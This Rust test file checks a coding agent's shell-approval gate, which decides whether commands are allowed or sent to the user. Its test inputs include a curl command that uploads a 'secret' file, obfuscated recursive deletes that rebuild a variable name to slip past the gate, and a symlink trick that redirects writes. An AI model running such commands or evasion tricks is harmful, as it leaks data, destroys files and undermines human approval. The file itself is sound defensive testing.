//! Automatic shell approval never infers file ownership from command text.

use super::*;
use crate::consent::{ConsentStore, InMemoryConsentStore, args_key};
use crate::decision::Outcome;
use houyicoder_api::sandbox::{Containment, Coverage, SideEffect};
use std::env::temp_dir;
use std::fs::{create_dir, remove_dir_all, write};
use std::path::PathBuf;
use std::process::id;
use std::sync::atomic::{AtomicU64, Ordering};

#[cfg(unix)]
use std::fs::remove_file;
#[cfg(unix)]
use std::os::unix::fs::symlink;

struct TestDir(PathBuf);

impl TestDir {
    fn new() -> Self {
        static COUNT: AtomicU64 = AtomicU64::new(0);
        let path = temp_dir().join(format!(
            "hy-shell-policy-{}-{}",
            id(),
            COUNT.fetch_add(1, Ordering::Relaxed)
        ));
        create_dir(&path).expect("create test directory");
        Self(path)
    }
}

impl Drop for TestDir {
    fn drop(&mut self) {
        remove_dir_all(&self.0).expect("remove owned test directory");
    }
}

struct TestFence {
    directory: PathBuf,
    active: bool,
}

impl Containment for TestFence {
    fn coverage(&self) -> Coverage {
        if self.active {
            Coverage::Fenced {
                writable_roots: vec![self.directory.clone()],
            }
        } else {
            Coverage::Unfenced
        }
    }

    fn would_block(&self, _: SideEffect) -> Option<String> {
        None
    }
}

fn gate(directory: &TestDir, active: bool) -> DefaultModeGate {
    DefaultModeGate::with_mode(PermissionMode::Auto)
        .with_trusted_hosts()
        .with_containment(Arc::new(TestFence {
            directory: directory.0.clone(),
            active,
        }))
}

#[test]
fn test_origin_keeps_output_ask() {
    let directory = TestDir::new();
    let gate = gate(&directory, true);
    let command = "curl -sS https://example.test/ -o \"$TMPDIR/result.log\"";
    assert_eq!(gate.decide(&bash_req(command)).outcome(), Outcome::Ask);
    gate.add_egress_allow("curl https://example.test");
    assert_eq!(gate.decide(&bash_req(command)).outcome(), Outcome::Ask);
    assert_eq!(
        gate.decide(&bash_req("curl -sS https://example.test/next"))
            .outcome(),
        Outcome::Allow
    );
    gate.add_egress_allow("curl https://docs.rs");
    for command in [
        "curl -sS https://docs.rs/ -o \"$TMPDIR/result.log\"",
        "curl -sS https://docs.rs/ --output=\"$TMPDIR/result.log\"",
        "curl https://example.test/a https://docs.rs/b -o \"$TMPDIR/result.log\"",
        "curl --data-binary @secret https://example.test/",
        "wget https://docs.rs/",
        "curl -O https://docs.rs/file",
    ] {
        assert_eq!(
            gate.decide(&bash_req(command)).outcome(),
            Outcome::Ask,
            "{command}"
        );
    }
}

#[test]
fn test_temp_delete_asks() {
    let directory = TestDir::new();
    for active in [false, true] {
        let gate = gate(&directory, active);
        for command in [
            "rm -rf \"$TMPDIR/build\"",
            "COV_DIR=TMP; COV_DIR=$COV_DIR'DIR'; getopts a \"$COV_DIR\" -a; rm -rf \"$TMPDIR/src\"",
            "name=TMP; name=$name'DIR'; pri'ntf' -v \"$name\" /work/repo; rm -rf \"$TMPDIR/src\"",
        ] {
            assert_eq!(
                gate.decide(&bash_req(command)).outcome(),
                Outcome::Ask,
                "active={active}: {command}"
            );
        }
    }
}

#[test]
fn test_file_output_states() {
    let directory = TestDir::new();
    let gate = gate(&directory, true);
    let command = "printf changed > \"$TMPDIR/result.log\"";
    assert_eq!(gate.decide(&bash_req(command)).outcome(), Outcome::Ask);
    let target = directory.0.join("result.log");
    write(&target, "before").expect("write test output");
    assert_eq!(gate.decide(&bash_req(command)).outcome(), Outcome::Ask);
    #[cfg(unix)]
    {
        remove_file(&target).expect("remove owned output");
        let source = directory.0.join("source");
        write(&source, "before").expect("write test source");
        symlink(&source, &target).expect("create test symlink");
        assert_eq!(gate.decide(&bash_req(command)).outcome(), Outcome::Ask);
    }
    assert_eq!(
        gate.decide(&bash_req(
            "python3 -c 'import os;os.symlink(\"source\",os.environ[\"TMPDIR\"]+\"/created.log\")'; printf changed > \"$TMPDIR/created.log\""
        ))
        .outcome(),
        Outcome::Ask
    );
}

#[test]
fn test_read_commands_allow() {
    let gate = DefaultModeGate::with_mode(PermissionMode::Auto).with_trusted_hosts();
    for command in [
        "cat .claude/settings.json",
        "git status --short",
        "make check 2>&1 | tail -20",
        "curl -sS https://docs.rs/ -o /dev/null",
        "wget -O - https://docs.rs/",
    ] {
        assert_eq!(
            gate.decide(&bash_req(command)).outcome(),
            Outcome::Allow,
            "{command}"
        );
    }
}

#[test]
fn test_exact_output_consent() {
    let consent = Arc::new(InMemoryConsentStore::non_expiring());
    let gate = DefaultModeGate::with_mode(PermissionMode::Auto).with_consent(consent.clone());
    let request = bash_req("printf x > \"$TMPDIR/result.log\"");
    assert_eq!(gate.decide(&request).outcome(), Outcome::Ask);
    consent.record(request.tool_name, &args_key(request.input));
    assert_eq!(gate.decide(&request).outcome(), Outcome::Allow);
    assert_eq!(
        gate.decide(&bash_req("printf x > \"$TMPDIR/other.log\""))
            .outcome(),
        Outcome::Ask
    );
}
